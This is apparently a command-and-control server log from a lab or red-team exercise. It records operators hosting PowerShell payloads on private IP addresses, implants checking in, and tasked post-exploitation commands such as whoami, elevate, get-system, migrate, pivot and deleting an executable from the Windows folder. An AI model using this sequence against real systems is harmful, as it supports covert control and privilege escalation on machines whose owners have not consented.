11/05/2023 11:28:29 | Info | Agent | 38a1670b68 |  | Agent Checking In
11/05/2023 11:28:31 | Info | Agent | 4ddc7b13e9 |  | Agent Checking In
11/05/2023 11:28:39 | Info | User | Fropops-ad80f68c-6ea7-47f0-8afb-22ea6c741d12 |  | Connexion to TeamServer
11/05/2023 11:28:40 | Info | User | Fropops-ad80f68c-6ea7-47f0-8afb-22ea6c741d12 |  | Connexion to TeamServer
11/05/2023 11:29:01 | Info | User | Fropops-ad80f68c-6ea7-47f0-8afb-22ea6c741d12 | 4ddc7b13e9 | Command tasked to agent : shell hostname
11/05/2023 11:29:08 | Info | User | Fropops-ad80f68c-6ea7-47f0-8afb-22ea6c741d12 | 38a1670b68 | Command tasked to agent : shell whoami
11/05/2023 05:34:34 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df |  | Connexion to TeamServer
11/05/2023 05:34:35 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df |  | Connexion to TeamServer
11/05/2023 05:36:20 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df |  | Web hosting a/Payload PowerShell x64 https://192.168.174.128:443
11/05/2023 05:44:18 | Info | Agent | 850a385fd3 |  | Agent Checking In
11/05/2023 05:44:28 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 850a385fd3 | Command tasked to agent : shell whoami
11/05/2023 05:44:42 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 850a385fd3 | Command tasked to agent : whoami
11/05/2023 05:45:44 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 850a385fd3 | Command tasked to agent : elevate -p c:\users\olivier -i -f installTool
11/05/2023 05:47:20 | Info | Agent | ad2b99a5d4 |  | Agent Checking In
11/05/2023 05:47:42 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 850a385fd3 | Command tasked to agent : service
11/05/2023 05:47:48 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 850a385fd3 | Command tasked to agent : pivot show
11/05/2023 05:48:46 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | ad2b99a5d4 | Command tasked to agent : get-system
11/05/2023 05:48:58 | Info | Agent | 6e9de4d413 |  | Agent Checking In
11/05/2023 05:49:34 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 6e9de4d413 | Command tasked to agent : migrate
11/05/2023 05:49:41 | Info | Agent | c71d9b2a50 |  | Agent Checking In
11/05/2023 05:50:00 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | 6e9de4d413 | Command tasked to agent : terminate
11/05/2023 05:50:24 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df | c71d9b2a50 | Command tasked to agent : shell del c:\windows\fd505478f2.exe
11/05/2023 09:20:45 | Info | User | Fropops-bc700c6a-a36b-46a8-ab1c-bd737ebe17df |  | Exit TeamServer
11/05/2023 09:24:27 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 |  | Connexion to TeamServer
11/05/2023 09:24:28 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 |  | Connexion to TeamServer
11/05/2023 09:24:42 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 |  | Connexion to TeamServer
11/05/2023 09:26:49 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 |  | Web hosting psad - Payload PowerShell x64 https://192.168.56.129:443
11/05/2023 09:27:32 | Info | Agent | 99e59d84a5 |  | Agent Checking In
